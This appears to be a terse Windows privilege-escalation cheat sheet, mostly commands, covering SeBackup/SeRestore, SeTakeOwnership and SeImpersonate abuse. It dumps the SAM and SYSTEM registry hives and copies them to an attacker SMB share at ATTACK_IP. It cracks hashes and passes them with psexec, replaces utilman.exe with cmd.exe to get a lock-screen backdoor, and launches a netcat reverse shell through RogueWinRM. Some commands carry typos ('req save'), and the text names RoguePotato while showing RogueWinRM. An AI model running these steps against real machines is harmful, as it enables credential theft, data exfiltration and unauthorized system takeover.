# Privilege check command: whoami /priv

# Examples of dangerous privileges:

## SeBackup/SeRestore

#### 1: Backup SAM and SYSTEM hashes

#### req save hklm\system c:\users\user\system.hive

#### req save hklm\sam c:\users\user\sam.hive

#### 2: Create SMB Server on attacking machine

#### 1: mkdir share

#### 2: python3 impacket-smbserver.py -smb2support -username USER -password PASSWORD public share

#### 3: Copy backups to share folder

#### copy c:\users\user\sam.hive \\ATTACK_IP\public\

#### copy c:\users\user\system.hive \\ATTACK_IP\public\

#### 4: Retrieve hashes

#### python3 impacket-secretsdump.py -sam sam.hive -system system.hive LOCAL

#### 5: Pass-The-Hash Attack (PtH)

#### python3 impacket-psexec.py -hashes HASH administrator@TARGET_IP

#### TIP: We can also use evil-winrm for PtH attacks.

## SeTakeOwnership

#### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.

### Example: Utilman.exe

#### 1: takeown /f c:\windows\system32\utilman.exe

#### 2: icacls c:\windows\system32\utilman.exe /grant USER:F

#### 3: copy cmd.exe utilman.exe

#### 4: Trigger uitlman : Lock screen, click ease of access

## SeImpersonate/SeAssignPrimaryToken

### A lot of potato exploits work with these privileges, so in our example we will stalk about RoguePotato.

#### RogueWinRM.exe exploit

#### 1: Start listener

#### c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"
